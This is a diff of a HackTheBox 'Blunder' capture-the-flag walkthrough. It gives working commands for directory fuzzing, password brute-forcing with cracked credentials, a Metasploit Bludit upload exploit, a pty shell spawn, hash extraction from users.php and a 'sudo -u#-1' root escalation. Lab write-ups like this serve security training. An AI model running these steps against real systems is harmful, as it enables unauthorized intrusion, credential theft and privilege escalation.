@@ -20,47 +20,62 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 * Check existing directories with
-  * `$ dirb http://10.10.10.191 -o dirb_fuzzed.txt`
+  * `./ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.191/FUZZ -e .txt,.html,.php -o ffuf_fuzzed.txt`
 
 ```
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
+       v1.1.0
+________________________________________________
 
-OUTPUT_FILE: fuzzed.txt
-START_TIME: Tue Oct 13 06:02:30 2020
-URL_BASE: http://10.10.10.191/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+ :: Method           : GET
+ :: URL              : http://10.10.10.191/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .txt .html .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
 
------------------
-
-GENERATED WORDS: 4612
-
----- Scanning URL: http://10.10.10.191/ ----
-+ http://10.10.10.191/0 (CODE:200|SIZE:8045)
-+ http://10.10.10.191/about (CODE:200|SIZE:3281)
-==> DIRECTORY: http://10.10.10.191/admin/
-+ http://10.10.10.191/cgi-bin/ (CODE:301|SIZE:0)
-+ http://10.10.10.191/empty (CODE:200|SIZE:3576)
-+ http://10.10.10.191/LICENSE (CODE:200|SIZE:1083)
-+ http://10.10.10.191/robots.txt (CODE:200|SIZE:22)
-+ http://10.10.10.191/server-status (CODE:403|SIZE:277)
-+ http://10.10.10.191/xyz (CODE:200|SIZE:3319)
-
----- Entering directory: http://10.10.10.191/admin/ ----
-+ http://10.10.10.191/admin/ajax (CODE:401|SIZE:0)
-
------------------
-END_TIME: Tue Oct 13 06:17:57 2020
-DOWNLOADED: 9224 - FOUND: 9
+.php                    [Status: 403, Size: 277, Words: 20, Lines: 10]
+.html                   [Status: 403, Size: 277, Words: 20, Lines: 10]
+                        [Status: 200, Size: 7561, Words: 794, Lines: 171]
+.hta.txt                [Status: 403, Size: 277, Words: 20, Lines: 10]
+.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
+.hta.html               [Status: 403, Size: 277, Words: 20, Lines: 10]
+.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess.html          [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htpasswd.txt           [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htpasswd.html          [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10]
+0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]
+about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
+admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
+cgi-bin/                [Status: 301, Size: 0, Words: 1, Lines: 1]
+install.php             [Status: 200, Size: 30, Words: 5, Lines: 1]
+LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]
+robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
+robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
+:: Progress: [18456/18456] :: Job [1/1] :: 128 req/sec :: Duration: [0:02:24] :: Errors: 0 ::
 ```
 
 * Create our own wordlist for the fuzzer
   * `$ cewl 10.10.10.191 -w dict.txt`
 
-* Download bruteforce tool for Blunder [here](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)
+* Download bruteforce tool for Blunder [here](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) and name it fuzzer.py
 
 * Change ip address, username and wordlist
 ```python3
@@ -111,6 +126,42 @@ for password in file:
   * `$ python3 fuzzer.py`
 
 ```
+            ...
 SUCCESS: Password found!
 Use fergus:RolandDeschain to login.
+```
+
+* Execute metasploit with fergus credentials
+
+```
+$ sudo msfconsole
+msf > use exploit/linux/http/bludit_upload_images_exec
+msf exploit(bludit_upload_images_exec) > show targets
+    ...targets...
+msf exploit(bludit_upload_images_exec) > set TARGET 0
+msf exploit(bludit_upload_images_exec) > show options
+    ...show and set options...
+msf exploit(bludit_upload_images_exec) > exploit
+```
+```
+meterpreter > shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+$ cd /var/www/bludit-3.10.0a/bl-content/databases
+$ cat users.php
+```
+
+* Own user
+  * We collect the sha1 hash of the hugo user and we decrypt it, then:
+```
+$ su hugo
+Password:
+$ cat /home/hugo/user.txt
+```
+
+
+* Own root
+```
+$ sudo -l
+$ sudo -u#-1 /bin/bash
+$ cat /root/root.txt
 ```
